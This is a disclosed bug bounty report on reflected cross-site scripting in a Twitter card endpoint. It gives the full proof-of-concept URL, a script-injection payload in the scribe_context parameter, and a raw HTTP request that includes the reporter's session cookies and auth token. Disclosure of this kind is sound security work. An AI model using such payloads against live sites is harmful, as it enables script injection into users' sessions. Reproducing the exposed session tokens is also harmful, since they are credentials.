#  Cross-site scripting (reflected)

## Report Details
- **Report ID**: 176754
- **URL**: https://hackerone.com/reports/176754
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2016-10-19T10:29:51.341Z
- **Disclosed**: 2016-12-09T13:30:49.460Z

## Reporter
- **Username**: linkks
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
hi Twitter team

https://twitter.com/i/cards/tfw/v1/788663483873263617?cardname=player&autoplay_disabled=true&forward=true&earned=true&lang=en&card_height=130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv

The value of the scribe_context request parameter is copied into a JavaScript string which is encapsulated in double quotation marks. The payload l4tqu</script><script>alert(1)</script>o7gyv was submitted in the scribe_context parameter. This input was echoed unmodified in the application's response.

GET /i/cards/tfw/v1/788663483873263617?cardname=player&autoplay_disabled=true&forward=true&earned=true&lang=en&card_height=130&scribe_context=l4tqu%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3eo7gyv HTTP/1.1
Host: twitter.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://twitter.com/
Cookie: guest_id=v1%3A146255384359384655; _ga=GA1.2.178796086.1467670836; kdt=qU1PQNfIb0sNg6vhmvMkEIe1zla3g5clz7cCgLds; remember_checked_on=1; twid="u=4092731777"; auth_token=b4a4eb0642ec5579bf2f58a98d1eca87ad9552a7; moments_profile_moments_nav_tooltip_self=true; eu_cn=1; mp_c3de24deb6a3f73fba73a616bb625130_mixpanel=%7B%22distinct_id%22%3A%20%22ce74a9d62a1e8a572a472095b248ab3f4167e8341d603b9d689bf497fca88101%22%2C%22isAdmin%22%3A%20false%2C%22isAccountSpending%22%3A%20false%2C%22serviceLevel%22%3A%20%22null%22%2C%22goalBased%22%3A%20true%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fads.twitter.com%2Fnew_campaign%2F18ce54aqb54%2Fstart%22%2C%22%24initial_referring_domain%22%3A%20%22ads.twitter.com%22%7D; mbox=check#true#1476741932|session#dd4f8eba87774a26834c0ce387200a8a#1476743732|PC#dd4f8eba87774a26834c0ce387200a8a.26_5#1477951472; SSESS3c8b2bbd5af1180dab341c61a9900084=krekirm43u81j7g7bqbt9uij76; lang=it; moments_user_moment_profile_create_moment_tooltip=true; _twitter_sess=BAh7CSIKZmxhc2hJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNo%250ASGFzaHsABjoKQHVzZWR7ADoPY3JlYXRlZF9hdGwrCH3hdNxXAToMY3NyZl9p%250AZCIlZWRlZWQyYzFhYjMwYWYwOTJjMDEwZGM0NzM0NDIxMTk6B2lkIiU3MGQ4%250AMWY5MDI3Y2RjZWQyYmY3OGI2NTEwZTQxOGVkZQ%253D%253D--c5e4969a1a90f82f0db9ffa1991f7a2da912bfba; lang=en
Connection: close



## Attachments
- H8ROxPewSU2iUs099pCJuw_1_.jpg
